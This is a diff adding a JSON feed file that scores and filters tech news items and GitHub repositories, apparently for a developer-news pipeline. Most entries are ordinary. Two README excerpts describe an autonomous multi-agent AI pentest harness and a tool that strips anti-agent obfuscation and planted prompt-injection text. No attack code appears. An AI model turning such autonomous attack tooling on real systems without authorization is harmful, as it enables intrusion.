@@ -1,0 +1,1689 @@
+[
+ {
+  "title": "huamidev/GestaltX",
+  "url": "https://github.com/huamidev/GestaltX",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 6413,
+  "language": "Swift",
+  "topics": [],
+  "publishedAt": "2026-11-09T05:15:48Z",
+  "body": "An MobileGestalt editor for iOS 27.x, featuring region-code tweaks, device presets, backups, and support for 7 languages.\n\nREADME 節錄： GestaltX English · 简体中文 · 日本語 A MobileGestalt editor for iPhone and iPad. Developed by huamidev. ## Features | Category | Presets and tools | | --- | --- | | Display | Dynamic Island capability and layout, Always-On Display, AOD Vibrancy, high-luminance AOD, AOD flipbook, HDR photo display, wallpaper parallax, Liquid Glass low-power rendering, experimental PWM and DisplayPort flags | | Device | Model name, boot/shutdown chime, charge limit, tap to wake, Camera Control settings, Action Button settings, Collision SOS, Audio Mix, Spatial FaceTime audio | | iPad | Apple Pencil settings, Stage Manager capability, iPad app compatibility | | Intelligence | Independent region-code options, Apple Intelligence capability flag, on-device Siri, Audio Intelligence, Personal Translator, Photos Clean Up, Handwriting Synthesis, always-listening Hey Siri, and sales-region options for activation attempts on China-mainland devices | | Advanced | Apple internal feature flags, the system-wide InternalBuild flag with explicit enable confirmation, internal settings bundle, Security Research Device flag | | Field editor | Read, search, add, edit, and remove `CacheExtra` fields; local plist import/export; String, Integer, Real, Boolean, Data, Date, Array, and Dictionary values | | Changes | Automatic reading and manual re-read, staged before/after review, verified writ",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "開源iOS工具，涉Apple Intelligence可用性"
+  },
+  "scores": [
+   33,
+   28
+  ],
+  "score": 30,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "deepseek-ai/dsh-superagent-prototype",
+  "url": "https://github.com/deepseek-ai/dsh-superagent-prototype",
+  "source": "GitHub DSH 生態",
+  "sourceId": "gh-dsh",
+  "kind": "github",
+  "stars": 22546,
+  "language": "TypeScript",
+  "topics": [],
+  "publishedAt": "2026-10-31T09:32:46Z",
+  "body": "Towards a More Autonomous Agent System\n\nREADME 節錄：# dsh-superagent > **Research prototype for reference only, not an official DeepSeek product.** This code grew out of our team's day-to-day development work, with much of the engineering done by coding agents. Treat it as research code, not production-ready software. It may still contain bugs, and its coding style and engineering practices may be inconsistent. Review and adapt it before using it in your own environment. > > We have adapted it for publication, so it is not identical to our internal version or the implementation described in *Exploring Super-agent Design: Towards a More Autonomous Agent System*. Some designs discussed in the article are directions for future development and are not implemented in this prototype. dsh-superagent is a proactive coding agent for one GitHub repository, packaged as a bundle for DeepSeek Harness. It listens to GitHub and, optionally, Feishu. When someone allowed asks the agent for work, it opens a work item, works on it in its own agent session and directory, and answers in the original conversation, for example with a pull request. A web panel shows what needs a person. It is also a way of working with an agent: **take as little human attention as possible, and give as much value as possible.** An agent that can act for a whole team can also waste a whole team's attention, so it acts only when asked or when a rule the team wrote allows it, and speaks only when someone must act or can ",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "DeepSeek 官方 superagent 原型，與 coding agent 開發直接相關"
+  },
+  "scores": [
+   58,
+   66
+  ],
+  "score": 62,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "SsKanDon/blender-ai-mcp-addon",
+  "url": "https://github.com/SsKanDon/blender-ai-mcp-addon",
+  "source": "GitHub Agent 技能",
+  "sourceId": "gh-agent",
+  "kind": "github",
+  "stars": 136,
+  "language": null,
+  "topics": [
+   "ai-agents",
+   "ai-assistant",
+   "blender",
+   "blender-addon",
+   "blender-ai",
+   "blender-automation",
+   "blender-mcp",
+   "blender-plugin",
+   "blender-scripting",
+   "bpy",
+   "chatgpt",
+   "claude",
+   "gemini",
+   "llm",
+   "mcp",
+   "mcp-for-blender",
+   "mcp-server",
+   "model-context-protocol",
+   "ollama",
+   "opencode"
+  ],
+  "publishedAt": "2026-11-11T17:24:32Z",
+  "body": "AI assistant and MCP server for Blender: visual chat, scene tools, multi-agent workflows. Works with ChatGPT/GPT, Claude, Gemini, Ollama, OpenCode. Blender AI addon, copilot for 3D, bpy Python scripting, MCP integration.\n\nREADME 節錄：# mcp-for-blender-pro ### Your Blender scene. Your AI models. One creative workspace. **An AI assistant for Blender that can inspect your scene, build objects, edit materials, find assets and carry out multi-step workflows—with a visual chat workspace and a built-in Model Context Protocol (MCP) server.** Download · Getting started · Connections and agents ## Turn a creative brief into scene operations Start with an idea. Ask the assistant to inspect your scene, create a product-display layout, arrange objects, assign materials or prepare an export. Follow its actions in the conversation and inspect the result in the viewport preview. Keep working in Blender throughout the process. **mcp-for-blender-pro brings conversation, scene tools, model choice and agent workflows together.** It is designed for artists who want faster iteration, technical artists who automate repetitive work, and developers connecting AI tools to Blender. ## Why choose mcp-for-blender-pro? | Capability | What it gives you | |---|---| | **Blender-aware assistance** | Scene and object inspection gives the assistant context before it acts. | | **A visual Studio workspace** | Chat, scene objects, viewport snapshots, approvals and a task board in a companion window. | | **Your choic",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "Blender AI MCP 外掛與 Agent/MCP/開發工具有實質關係"
+  },
+  "scores": [
+   72,
+   41
+  ],
+  "score": 56,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "93% of paint splatters are valid Perl programs (2019)",
+  "url": "https://www.mcmillen.dev/sigbovik",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T22:34:23.000Z",
+  "body": "Article URL: https://www.mcmillen.dev/sigbovik/ Comments URL: https://news.ycombinator.com/item?id=50459745 Points: 220 # Comments: 32",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "Perl程式語言趣味研究，與寫程式開發相關"
+  },
+  "scores": [
+   44,
+   39
+  ],
+  "score": 41,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Gemini Decisions API",
+  "url": "https://simonwillison.net/2026/Nov/11/gemini-decisions-api",
+  "source": "Simon Willison",
+  "sourceId": "simonw",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T22:03:25.000Z",
+  "body": "Gemini Decisions API Google join Jev and OpenAI in the decision model category with \"Gemini Decision 1\". This new model API is almost identical to Jev: it supports the same three types of questions (yes/no, choice, and rubric-scoring) and even reuses Jev's term \"Noul\" for a yes/no question. It's priced the same as the GPT-6 Luna decision model: 10 cents per million input tokens, and output is free. Jev remains the cheapest of the three, at 4.2 cents per million. Jev is text (and JSON) only. OpenAI can handle text and images. Gemini Decision 1 is fully multi-model: it covers text, images, audio, video, and PDFs. I tested it against video by passing these questions to it along with my Yonkers stomping robot video file: dragon: Does this video have a dragon in it? robot: Does this video have a robot in it? france: Is this video set in France? usa: Is this video set in the USA? Jev and OpenAI both return 1.0 or 0.0 for yes/no questions, but Gemini insists on being a little less confident than that: { \"dragon\" : { \"type\" : \" yes_no \" , \"probability\" : 0.04976021841520312 }, \"robot\" : { \"type\" : \" yes_no \" , \"probability\" : 0.9234055387792485 }, \"france\" : { \"type\" : \" yes_no \" , \"probability\" : 0.08329171353166241 }, \"usa\" : { \"type\" : \" yes_no \" , \"probability\" : 0.9230459995157706 } } Via Hacker News Tags: ai , generative-ai , gemini , llm-release , jev , decision-models",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AI模型決策API與價格資訊"
+  },
+  "scores": [
+   66,
+   64
+  ],
+  "score": 65,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "BotPsy: On-Device Personal Assistant with a Sub-Billion-Parameter Agentic Language Model",
+  "url": "https://huggingface.co/blog/qvac/botpsy",
+  "source": "Hugging Face Blog",
+  "sourceId": "hf",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T05:01:16.000Z",
+  "body": "",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "裝置端agentic語言模型助理，與AI模型相關"
+  },
+  "scores": [
+   36,
+   39
+  ],
+  "score": 37,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Gilbert + Tobin rethinks the business of law with AI",
+  "url": "https://openai.com/index/gilbert-tobin-sam-nickless",
+  "source": "OpenAI News",
+  "sourceId": "openai",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-12T00:00:00.000Z",
+  "body": "A conversation with Sam Nickless, Partner and Chief Executive Officer at Gilbert + Tobin.",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "律所導入AI的商業案例，與開發工具無關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "AlphaGenome 2: Deciphering how cells read DNA to better understand disease",
+  "url": "https://deepmind.google/blog/alphagenome-2-deciphering-how-cells-read-dna-to-better-understand-disease",
+  "source": "Google DeepMind",
+  "sourceId": "deepmind",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T15:00:15.000Z",
+  "body": "Predicting how DNA sequences and their variations impact specific human cell types and disease.",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "DeepMind 發表的 AI 基因體模型，屬 AI 模型範疇"
+  },
+  "scores": [
+   27,
+   29
+  ],
+  "score": 28,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Issue types and fields are available for personal accounts",
+  "url": "https://github.blog/changelog/2026-11-11-issue-types-and-fields-are-available-for-personal-accounts",
+  "source": "GitHub Changelog",
+  "sourceId": "ghchangelog",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T17:16:46.000Z",
+  "body": "Issue types and issue fields are now generally available on repositories owned by personal accounts. This brings the same planning capabilities to individual developers and open source maintainers to standardize… The post Issue types and fields are available for personal accounts appeared first on The GitHub Blog .",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "GitHub 開發工具功能更新，與開發者相關"
+  },
+  "scores": [
+   32,
+   18
+  ],
+  "score": 25,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "[AINews] Mercor $750m Series D at $20B valuation, $3B run rate",
+  "url": "https://latent.space/p/ainews-mercor-750m-series-d-at-20b-valuation-3b-run-rate",
+  "source": "Latent Space",
+  "sourceId": "latent",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T09:34:28.000Z",
+  "body": "November 10, 2026 — Google GA's Gemini 4 Carbon.",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "內文含 Gemini 4 正式發布，屬模型可用性消息"
+  },
+  "scores": [
+   24,
+   12
+  ],
+  "score": 18,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "tangerineturtle1/NX2navi",
+  "url": "https://github.com/tangerineturtle1/NX2navi",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 3307,
+  "language": "C",
+  "topics": [],
+  "publishedAt": "2026-11-07T10:01:23Z",
+  "body": "\n\nREADME 節錄： # NX2navi **Join the official NX2navi update discord server: https://discord.com/invite/uf6gSrsPpq** **NX2navi** is a static recompilation of *The Legend of Zelda: Ocarina of Time* for Nintendo Switch 2 (game version 1.1.1) into a native x86-64 application for Windows, with a Vulkan renderer (docs/architecture.md). > [!IMPORTANT] > **No game files are included.** You need your own legally obtained copy of the game, dumped from your own console. > Instructions for obtaining those files will not be provided. > > The game is built from your files on your machine, so the result contains the game. It is for your own use. Do not share it. ## Status Early development, playable. Kokiri Forest, Kakariko Village, Death Mountain Trail and its crater, the Temple of Time and the Great Fairy fountains play at 60 fps and above on current GPUs, from the title screen and from saves. Visual bugs and occasional crashes are still expected (Known issues). Report problems as issues, following CONTRIBUTING.md. ## Features - Native code, not emulation - 60 fps by default, or a limit of 30 to 240 fps, the display's refresh rate or unlimited - Native widescreen and ultrawide (the window's shape, 21:9 or 32:9) with the HUD, menus and movies kept 16:9 - Game resolutions from 1080p to above the game's 1440p: 1800p, 4K, 5K or the window's own size, sharp on high-DPI displays - Upscaling and anti-aliasing: NVIDIA DLSS (DLAA, Quality, Balanced, Performance, Ultra Performance; RTX GPUs) or AMD F",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "開源遊戲重編譯專案，與開發相關"
+  },
+  "scores": [
+   38,
+   41
+  ],
+  "score": 39,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "N1nEmAn/sapper-v2",
+  "url": "https://github.com/N1nEmAn/sapper-v2",
+  "source": "GitHub DSH 生態",
+  "sourceId": "gh-dsh",
+  "kind": "github",
+  "stars": 1994,
+  "language": "Python",
+  "topics": [
+   "agentic-workflows",
+   "ai-agents",
+   "ai-security",
+   "autonomous-agents",
+   "claude-code",
+   "ctf",
+   "cybersecurity",
+   "fact-graph",
+   "llm",
+   "multi-agent",
+   "pentest",
+   "swarm-intelligence"
+  ],
+  "publishedAt": "2026-10-30T15:12:35Z",
+  "body": "The first fruit of the Nüwa tree — an autonomous AI pentest legion (634-team champion, 8h unattended, 1B tokens beat 4.5B). Not just a tool: evolvable by design. Grow your own fruit on the Nüwa Foundation (Create/Language/History).\n\nREADME 節錄：# sapper-v2 — The Autonomous Pentest Legion > **Champion** of the 3rd Tencent Cloud Intelligent Attack-Defense Challenge online qualifier > (634 teams · 80.18/100 · 8 hours fully unattended) · **First Prize**, GeekCon 2026 AI Challenge > > Same 85 flags as the runner-up, 25 seconds faster — on **1B tokens** where they burned 4.5B. > > **This was the first time an AI ape looked up at the stars.** 📖 **Full design article (WeChat, in Chinese)** — the Nüwa Test, the three-capability foundation, 18 iterations, emergence, and the taggant proposal. **English** | 中文 **⚠️ AUTHORIZED SECURITY TESTING ONLY — see DISCLAIMER.md.** ## Meet sapper in 60 seconds https://github.com/user-attachments/assets/1560dc0c-2c92-42b8-a42f-698848fb5878 🎬 中文版：中文宣传片 ## What this is (and isn't) **sapper is a multi-agent orchestration harness, not a single agent.** It does not bind to any specific AI model or CLI — you can freely swap the agent and model behind every role: | What you can swap | How | Examples | |---|---|---| | **Agent CLI** | `nuwa spawn --agent ` or env var | Claude Code / Codex / Code Buddy / DeepSeek / any interactive CLI | | **Model** | `--model` flag or `SAPPER_MODEL` env | GLM-5.3 / DeepSeek V4.1 Flash / Claude Sonnet / any model | | **Role com",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "多代理編排框架，支援Claude Code等coding agent"
+  },
+  "scores": [
+   54,
+   55
+  ],
+  "score": 54,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "pktq/lasik",
+  "url": "https://github.com/pktq/lasik",
+  "source": "GitHub Agent 技能",
+  "sourceId": "gh-agent",
+  "kind": "github",
+  "stars": 105,
+  "language": "TypeScript",
+  "topics": [
+   "ai-agents",
+   "anti-bla",
+   "bla",
+   "claude-code",
+   "deobfuscation",
+   "deobfuscator",
+   "electron",
+   "javascript",
+   "lasik",
+   "llm-security",
+   "malware-analysis",
+   "mcp",
+   "mcp-server",
+   "prompt-injection",
+   "rea",
+   "reverse-engineering",
+   "static-analysis",
+   "webassembly"
+  ],
+  "publishedAt": "2026-11-09T16:35:56Z",
+  "body": "BLA blinds your agent. LASIK gives it its sight back. Static de-blinding CLI + MCP server that undoes BLA (Blind LLM Agents) hardening so coding agents and REA can read the real code again. Never executes the target.\n\nREADME 節錄： English · 简体中文 · 日本語 · 한국어 · Español Static deobfuscation for anti-agent hardening. LASIK removes BLA protection layers so coding agents and analysis tools can read the real program. 0.3: structural detection. Protection is identified by what it does, not by its names, so renamed builds heal too. Benchmark How it works · Benchmark · Changelog LASIK reads a protected build, proves which parts are protection (opaque predicates, encrypted strings, decoy code, tamper checks, binary padding, prompt-injection text), removes them, and writes a clean copy. It never runs the input. ## Highlights - **1,262× fewer tokens** on the public BLA CrackMe corpus: about 21 million down to 17 thousand. - **Proof-based.** A transform runs only when LASIK can prove it preserves behaviour. Unprotected files come back byte-identical. - **Structural detection.** Protection is recognised by behaviour, not identifiers; a renamed-build benchmark runs in CI. - **Static only.** No `eval`, no sandbox, no WebAssembly instantiation; safe on hostile input. - **Prompt-injection firewall** for text planted to steer the model. - **21 formats**: JavaScript and TypeScript bundles, inline HTML, WebAssembly, Electron ASAR and fuses, source maps, Python and `.pyc`, native ELF/PE/Mach-O, Bun, ",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "MCP與反混淆工具，助coding agent讀取程式碼，相關"
+  },
+  "scores": [
+   59,
+   61
+  ],
+  "score": 60,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Nvidia is preparing to oust Jensen Huang",
+  "url": "https://www.wsj.com/business/nvidia-is-preparing-to-oust-nvidia-ceo-jensen-huang-30f421ad",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T22:31:06.000Z",
+  "body": "Article URL: https://www.wsj.com/business/nvidia-is-preparing-to-oust-nvidia-ceo-jensen-huang-30f421ad Comments URL: https://news.ycombinator.com/item?id=50459703 Points: 648 # Comments: 914",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "僅Nvidia高層人事商業傳聞，與開發工具無關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "aws-emulator",
+  "url": "https://simonwillison.net/2026/Nov/11/aws-emulator",
+  "source": "Simon Willison",
+  "sourceId": "simonw",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T21:18:30.000Z",
+  "body": "aws-emulator Finally, an official emulator from AWS to run tests against a local clone of their many different services without having to provision a paid API key to do so. It's written in Rust by a huge swarm of agents - 29,684 commits in the first three weeks of the project. Swaminathan (Swami) Sivasubramanian wrote about how it came to be in a guest post on Werner Vogels' blog. It currently requires Docker to run on macOS or Windows. I'm hoping they fix that in the future - it would be great if you could download a single binary and use that as part of a standard test suite in other languages and on other platforms. Tags: amazon , amazon-web-services , testing , werner-vogels , ai , rust , docker , generative-ai , llms , agentic-engineering",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AWS 官方本地模擬器，與開發測試及 agent 工程相關"
+  },
+  "scores": [
+   48,
+   56
+  ],
+  "score": 52,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Token Pooling-Aware Training for Multi-Vector Embedding Models",
+  "url": "https://huggingface.co/blog/token-pooling",
+  "source": "Hugging Face Blog",
+  "sourceId": "hf",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T00:00:00.000Z",
+  "body": "",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "Hugging Face 嵌入模型訓練技術文章"
+  },
+  "scores": [
+   17,
+   18
+  ],
+  "score": 17,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "ChatGPT Plus for veterans and servicemembers",
+  "url": "https://openai.com/index/chatgpt-plus-for-veterans",
+  "source": "OpenAI News",
+  "sourceId": "openai",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T08:00:00.000Z",
+  "body": "More than 20,000 veterans and transitioning service members have claimed a free year of ChatGPT Plus. See how they use it to prepare for civilian careers.",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "退伍軍人免費方案，屬商業優惠非開發相關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "GitHub App support for Enterprise Copilot seat management",
+  "url": "https://github.blog/changelog/2026-11-10-github-app-support-for-enterprise-copilot-seat-management",
+  "source": "GitHub Changelog",
+  "sourceId": "ghchangelog",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T00:10:31.000Z",
+  "body": "Enterprise GitHub Apps can now call the enterprise-level Copilot seat management APIs to control which users and enterprise teams are assigned Copilot seats. The Copilot seat management APIs are accessible… The post GitHub App support for Enterprise Copilot seat management appeared first on The GitHub Blog .",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "GitHub Copilot 企業席位管理 API，屬開發工具"
+  },
+  "scores": [
+   2,
+   8
+  ],
+  "score": 5,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "AI Engineer Code Summit: OpenAI on New Ways of Working With Codex",
+  "url": "https://latent.space/p/codex-work",
+  "source": "Latent Space",
+  "sourceId": "latent",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T04:49:48.000Z",
+  "body": "On the first day of AIE Code Summit, OpenAI showed how developers can steer Codex by voice, hand off work to the cloud, and make use of dots.",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "OpenAI Codex 開發工作流程與 coding agent 實質相關"
+  },
+  "scores": [
+   36,
+   34
+  ],
+  "score": 35,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "jhaizhou-ops/S2Arm",
+  "url": "https://github.com/jhaizhou-ops/S2Arm",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 2624,
+  "language": "C#",
+  "topics": [
+   "apple-silicon",
+   "arm64",
+   "game-porting",
+   "ios",
+   "ipados",
+   "macos",
+   "metal",
+   "s2arm",
+   "static-recompilation",
+   "switch"
+  ],
+  "publishedAt": "2026-11-08T05:49:46Z",
+  "body": "Run your own Switch games natively on iPhone, iPad and Mac: game code rewritten to ARM64, graphics direct to Metal, one app for the whole library. Bring your own games and keys. 把你自己的 Switch 游戏原生带到 iPhone / iPad / Mac。\n\nREADME 節錄： s2arm.com > [!NOTE] > **Good news: s2arm.com is now the official S2Arm website.** S2Arm is free and open source and never accepts donations; get S2Arm only from s2arm.com or this GitHub repository. **Your own Switch games, running natively on iPhone, iPad and Mac.** Game code is rewritten to native ARM64 and runs directly on the device's processor, with graphics going straight to Metal. Your whole library lives in one app, and a few clicks in the Mac or Windows launcher take a game from import to play. Platforms: iPhone / iPad (iOS / iPadOS 18 and later) · Mac (Apple silicon, macOS 15 and later) · Build on Mac or Windows · Android / HarmonyOS coming soon · License: Apache-2.0 · **Bring your own games** 简体中文 · Download the launcher · All releases · Evidence ## A native port, not an emulator The game's own ARM64 code is rewritten at build time and then runs directly on the processor in your iPhone, iPad or Mac. There is no CPU emulator in between. Graphics calls are translated straight to Metal, and system services come from a native host. That is where the speed, the low heat and the battery life come from. Evidence ## One app, your whole library Every game you import goes into the same S2Arm app; open it and pick what to play. The whole library take",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "開源專案，Apple 平台遊戲移植與 ARM64/Metal 開發工具"
+  },
+  "scores": [
+   42,
+   63
+  ],
+  "score": 52,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "dabingfy-dot/solo-to-team-skills",
+  "url": "https://github.com/dabingfy-dot/solo-to-team-skills",
+  "source": "GitHub DSH 生態",
+  "sourceId": "gh-dsh",
+  "kind": "github",
+  "stars": 686,
+  "language": null,
+  "topics": [
+   "agent-skills",
+   "ai-agents",
+   "collaboration",
+   "human-in-the-loop",
+   "workflow"
+  ],
+  "publishedAt": "2026-11-07T01:36:28Z",
+  "body": "Skills for human-led AI teams: delegate tasks, verify evidence, explain steps clearly, and learn from real cases. 一个人统筹 AI 团队：派活、核证、清楚说明、经验复用。\n\nREADME 節錄：# Solo to Team · 一人成队 **English version: README.en.md** **团队组织与协作报告（PDF，17页）：docs/solo-to-team-value.pdf** 仓名：`solo-to-team-skills` 英文副标题：**Skills for human-led AI teams.** 中文说明：一个人统筹 AI 团队的协作技能包。 署：**大冰发起** > 文档状态：**v0.9-draft**，非最终发布稿，正式公开前还会改。已在多个 Agent 工具中完成实际使用验证（取得→装／配置→按名调用→产出登记行；另外当前包上八家各有一例有限任务的验收记录（真实成果→对照要求检查→人工验收）：Codex 保留此前单独验证的一例，其余七家按同一会议转写题补验，部分宿主经受阻重跑或退回修订后才通过；不代表稳定性或所有任务都能做成，调用方式各家不同（有的由使用者本人在宿主里发出，有的命令行或代点），部分宿主未保留技能加载的原始轨迹；不表示每家四个技能都逐一被调用，也不证明效果），范围：**Codex、WorkBuddy、DeepSeek Harness、Cursor、CodeBuddy、Kimi Work、千问办公（QwenWork）** 写「支持」；**Grok Bot** 写「支持，需手动配置」；**Claude Code** 结构已备、走通待补，不在首发支持之列。 ## 这是什么 一个人，也能带起一支 AI 团队。 这是一套**拿得到、装得上、叫得动**的协作技能包：四支技能＋一个模板＋说明＋脱敏案例。它帮你管住「一个人总控、多个长期 AI 助手」时最容易掉链子的几件事：活派出去有人收，说「做好了」有证据，写给新手的步骤照做就成，踩过的坑留下来给下一个人用。 借鉴的是方法思路；交付的是改写后的中文协作包，外加两支原创技能，并已在多个 Agent 工具里实际装上、按名调用过。借鉴来源见 `NOTICE` 和各技能末尾的来源／借鉴说明。 技能本身不带定时和叫醒（插件清单 `hooks: {}`）：到点查、记接单／收到成果／验收、叫开工，按技能正文里的步骤，由你或你用的 AI 工具来做。 ## 对我有什么用 - **一人成队：派出去的活，接得住、跟得上、收得回来。** 一条线走到底：派 → 收 → 核 → 判。每件活派出去前登记一行「待收」，写明谁在干、谁来收、谁到点查；收回来记「已收到成果」并写明结果在哪，核过证据记「已验收」才算完。登记行让还没人接的活一眼看得见；到点去查、去催，由你或宿主的定时能力来做（分工见下面「首版核心流程」三栏表）。 - **换工具，不必重学一套协作方法。** 四支核心技能的正文各家共用，方法学一次就行；每家从哪装、怎么叫、还要准备什么，按各家真实配置分别写在「各宿主怎么装、怎么叫」。 - **从一张表开始，迈出带领 AI 团队的第一步。** 主示例和登记行模板拿来就能用：先用记事本或表格把「派、收、核」练一遍。这一步练的是方法；想让 AI 助手按名调用技能，还要先装好一个 Agent 工具。 - **从真活里来。** 两个脱敏案例（日更流水线怎样改、验收链怎样抓漏）",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AI agent 協作技能包，含 DSH/Codex 等宿主支援說明"
+  },
+  "scores": [
+   55,
+   60
+  ],
+  "score": 57,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Lock Your GitHub Actions",
+  "url": "https://hugovk.dev/blog/2026/lock-github-actions",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T22:16:41.000Z",
+  "body": "Article URL: https://hugovk.dev/blog/2026/lock-github-actions/ Comments URL: https://news.ycombinator.com/item?id=50459485 Points: 165 # Comments: 28",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "GitHub Actions 安全，屬開發工具與 CI 議題"
+  },
+  "scores": [
+   27,
+   55
+  ],
+  "score": 41,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Browse tools.simonwillison.net by tag",
+  "url": "https://simonwillison.net/2026/Nov/11/tools-tags",
+  "source": "Simon Willison",
+  "sourceId": "simonw",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T18:42:50.000Z",
+  "body": "Browse tools.simonwillison.net by tag I've been wanting a better way to browse my collection of vibe-coded tools (244 and counting) for a while. I had a few Fable 5.2 credits left over before my weekly reset so I set it to work using tree-sitter to analyze the code for JavaScript APIs, libraries, and web API hosts used by each tool. The homepage now features tag clouds for browsing by each of those categories of tag: Tags: javascript , tools , ai , generative-ai , llms , claude , vibe-coding",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "開發工具目錄與 vibe-coding 工具瀏覽，與 coding agent 相關"
+  },
+  "scores": [
+   44,
+   62
+  ],
+  "score": 53,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "JioStar’s chief architect on AI discovery at 500M-user scale",
+  "url": "https://openai.com/index/jiostar-vijay-seshadri",
+  "source": "OpenAI News",
+  "sourceId": "openai",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T00:00:00.000Z",
+  "body": "JioStar’s Vijay Seshadri explains AI discovery at 500M-user scale. Read his lessons on evals, guardrails, and taking AI into production.",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AI生產化、評估與護欄，與開發實務相關"
+  },
+  "scores": [
+   16,
+   14
+  ],
+  "score": 15,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "JenkinWoo/sheeridVerify",
+  "url": "https://github.com/JenkinWoo/sheeridVerify",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 2045,
+  "language": "JavaScript",
+  "topics": [],
+  "publishedAt": "2026-11-06T09:28:09Z",
